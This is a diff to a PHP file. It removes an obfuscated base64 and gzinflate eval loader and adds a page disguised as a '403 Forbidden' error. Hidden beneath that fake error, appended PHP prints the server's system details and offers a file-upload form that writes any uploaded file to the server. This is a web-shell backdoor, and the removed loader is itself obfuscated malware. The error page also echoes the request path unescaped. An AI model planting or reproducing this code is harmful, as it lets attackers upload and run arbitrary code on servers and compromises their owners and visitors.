@@ -1,1 +1,16 @@
-<?php $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=5980484836121af16a6b7e29dbf97274a7d000cdXZHdauMwEIXvF/YdBlFQDF17l+1dFdO9cGnZQlMnKZQ0CNmaIIFtCUkOhNJ3rxy76Y8uJM2Z44/RMVOhbfKfP5hCIeMJcbGgQ4P5xe+/cG1cpaXEjmWjGJ3ZZGWVkYf3T9Sf/JM3VqM+7me9a7gVQcEcrHAeeRRmZ3xZlI9FuaFl8bAuliu+Lm/p9hwWN4t4veOLf6ub5PILwgV/ZASlu52ZncDvtnHHWhmgzOZPpgdpumcaQIk9gkXXau+16SAYEHWN3gOF9BN+Q6V2nWiRbqNOs+/dSnj8aMNAUtqDR7dHl7LM5vTLLEy5Y2hTWDGbMfDTkA5zmlpleT9gZ0lKnjuSUla5LGc741poMSgj58QaHwhgV4eDxTlp+yboYapscP2SIgiSM93ZPsDo2OkGCQzYOeH81JwEMrl8X7U6gvei6WO5to0RMpqP2PgavYu/anG/XCUv8XpVG3uIwvXtXbHcUM7pdkNDa/kYyjl8a41ykryM773/Ty9fsfE41UUZ69c3
+<html>
+<head>
+    <title>403 Forbidden</title>
+</head>
+<body>
+    <h1>Forbidden</h1>
+    <?php
+    $url_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+    $url_parts = pathinfo($url_path);
+    
+    echo '<p>You don\'t have permission to access ' . $url_parts['dirname'] . '/' . $url_parts['basename'] . ' on this server.</p>';
+    ?>
+    <hr>
+</body>
+</html>
+<?php echo '<pre>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>
